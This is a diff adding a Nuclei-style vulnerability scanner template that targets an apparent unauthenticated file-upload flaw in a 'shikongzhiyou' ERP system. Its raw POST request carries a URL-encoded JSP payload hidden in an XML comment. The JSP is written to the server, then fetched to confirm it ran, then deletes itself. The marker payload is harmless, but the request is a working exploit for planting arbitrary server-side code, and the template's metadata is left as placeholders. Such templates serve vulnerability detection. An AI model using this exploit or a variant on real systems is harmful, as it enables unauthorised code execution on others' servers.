@@ -1,0 +1,35 @@
+id: shikongzhiyou-erp-uploadStudioFile-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: description
+  reference:
+    - https://
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}" 
+http:
+  - raw:
+      - |
+        POST /formservice?service=updater.uploadStudioFile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Length: 1098
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+        content=<?xml%20version="1.0"?><root><filename>{{filename}}.jsp</filename><filepath>./</filepath><filesize>172</filesize><lmtime>1970-01-01%2008:00:00</lmtime></root><!--%3c%25%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%53%74%72%69%6e%67%28%6e%65%77%20%73%75%6e%2e%6d%69%73%63%2e%42%41%53%45%36%34%44%65%63%6f%64%65%72%28%29%2e%64%65%63%6f%64%65%42%75%66%66%65%72%28%22%5a%54%45%32%4e%54%51%79%4d%54%45%78%4d%47%4a%68%4d%44%4d%77%4f%54%6c%68%4d%57%4d%77%4d%7a%6b%7a%4d%7a%63%7a%59%7a%56%69%4e%44%4d%3d%22%29%29%29%3b%20%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%46%69%6c%65%28%61%70%70%6c%69%63%61%74%69%6f%6e%2e%67%65%74%52%65%61%6c%50%61%74%68%28%72%65%71%75%65%73%74%2e%67%65%74%53%65%72%76%6c%65%74%50%61%74%68%28%29%29%29%2e%64%65%6c%65%74%65%28%29%3b%25%3e-->
+      - |-
+        GET /update/temp/studio/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Length: 8
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+        Connection: close
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'e165421110ba03099a1c0393373c5b43'
